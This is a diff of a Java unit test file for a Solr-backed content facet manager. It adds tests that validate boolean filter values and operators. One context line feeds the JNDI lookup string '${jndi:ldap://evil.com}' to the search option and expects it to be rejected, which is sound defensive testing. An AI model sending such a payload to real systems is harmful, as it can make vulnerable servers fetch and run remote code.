@@ -56,7 +56,8 @@ class AdvContentFacetManagerTest {
     @Test
     void shouldGetFacetResultWithBeansFilterAndNodeCodesAsList() throws Exception {
         UserFilterOptionBean filterOptionBean = mock(UserFilterOptionBean.class);
-        when(filterOptionBean.extractFilter()).thenReturn(mock(SearchEngineFilter.class));
+        SearchEngineFilter searchEngineFilter = mock(SearchEngineFilter.class);
+        when(filterOptionBean.extractFilter()).thenReturn(searchEngineFilter);
         when(categoryManager.getCategory(CATEGORY_1)).thenReturn(new Category());
 
         SearchEngineFilter[] baseFilters = new SearchEngineFilter[]{};
@@ -208,6 +209,98 @@ class AdvContentFacetManagerTest {
         request.setSearchOption("${jndi:ldap://evil.com}");
         Assertions.assertThrows(ValidationConflictException.class,
                 () -> facetManager.getFacetedContents(request, null));
+    }
+
+    @ParameterizedTest
+    @ValueSource(strings = {"gt", "lt"})
+    void shouldRejectRangeOperatorOnBooleanFilter(String operator) {
+        AdvRestContentListRequest request = new AdvRestContentListRequest();
+        SolrFilter filter = new SolrFilter("myFlag", "true", operator);
+        filter.setType("boolean");
+        request.setFilters(new Filter[]{filter});
+        Assertions.assertThrows(ValidationConflictException.class,
+                () -> facetManager.getFacetedContents(request, null));
+    }
+
+    @Test
+    void shouldRejectNonStrictBooleanValue() {
+        AdvRestContentListRequest request = new AdvRestContentListRequest();
+        // A three-state "none" must not be sent as a boolean value: FilterType.BOOLEAN would
+        // silently coerce it to false via Boolean.parseBoolean.
+        SolrFilter filter = new SolrFilter("myFlag", "none", "eq");
+        filter.setType("boolean");
+        request.setFilters(new Filter[]{filter});
+        Assertions.assertThrows(ValidationConflictException.class,
+                () -> facetManager.getFacetedContents(request, null));
+    }
+
+    @Test
+    void shouldRejectNonStrictBooleanAllowedValue() {
+        AdvRestContentListRequest request = new AdvRestContentListRequest();
+        SolrFilter filter = new SolrFilter();
+        filter.setEntityAttr("myFlag");
+        filter.setType("boolean");
+        filter.setOperator("eq");
+        filter.setAllowedValues(new String[]{"true", "maybe"});
+        request.setFilters(new Filter[]{filter});
+        Assertions.assertThrows(ValidationConflictException.class,
+                () -> facetManager.getFacetedContents(request, null));
+    }
+
+    @Test
+    void shouldAcceptStrictBooleanValue() throws Exception {
+        AdvRestContentListRequest request = new AdvRestContentListRequest();
+        SolrFilter filter = new SolrFilter("myFlag", "true", "eq");
+        filter.setType("boolean");
+        filter.setEntityAttr("myFlag");
+        request.setFilters(new Filter[]{filter});
+        when(langManager.getDefaultLang()).thenReturn(createLang("en"));
+        when(((ISolrSearchEngineManager) searchEngineManager)
+                .searchFacetedEntities(
+                        any(SolrSearchEngineFilter[][].class),
+                        any(SolrSearchEngineFilter[].class),
+                        any(List.class)))
+                .thenReturn(new SolrFacetedContentsResult());
+        Assertions.assertDoesNotThrow(() -> facetManager.getFacetedContents(request, null));
+    }
+
+    @Test
+    void shouldAcceptStrictBooleanFalseValue() throws Exception {
+        // Mirrors shouldAcceptStrictBooleanValue with "false": closes the remaining branch of
+        // rejectIfNotStrictBoolean's "!true && !false" check (the value == "false" combination),
+        // never exercised by the "true"/"maybe"/"none" cases above.
+        AdvRestContentListRequest request = new AdvRestContentListRequest();
+        SolrFilter filter = new SolrFilter("myFlag", "false", "eq");
+        filter.setType("boolean");
+        filter.setEntityAttr("myFlag");
+        request.setFilters(new Filter[]{filter});
+        when(langManager.getDefaultLang()).thenReturn(createLang("en"));
+        when(((ISolrSearchEngineManager) searchEngineManager)
+                .searchFacetedEntities(
+                        any(SolrSearchEngineFilter[][].class),
+                        any(SolrSearchEngineFilter[].class),
+                        any(List.class)))
+                .thenReturn(new SolrFacetedContentsResult());
+        Assertions.assertDoesNotThrow(() -> facetManager.getFacetedContents(request, null));
+    }
+
+    @Test
+    void shouldAcceptNoValueNotEqualBooleanFilterAsExistenceQuery() throws Exception {
+        // The only valid recipe for querying a ThreeState "none": no value + not_equal.
+        AdvRestContentListRequest request = new AdvRestContentListRequest();
+        SolrFilter filter = new SolrFilter();
+        filter.setEntityAttr("myFlag");
+        filter.setType("boolean");
+        filter.setOperator("not");
+        request.setFilters(new Filter[]{filter});
+        when(langManager.getDefaultLang()).thenReturn(createLang("en"));
+        when(((ISolrSearchEngineManager) searchEngineManager)
+                .searchFacetedEntities(
+                        any(SolrSearchEngineFilter[][].class),
+                        any(SolrSearchEngineFilter[].class),
+                        any(List.class)))
+                .thenReturn(new SolrFacetedContentsResult());
+        Assertions.assertDoesNotThrow(() -> facetManager.getFacetedContents(request, null));
     }
 
     private static Lang createLang(String code) {
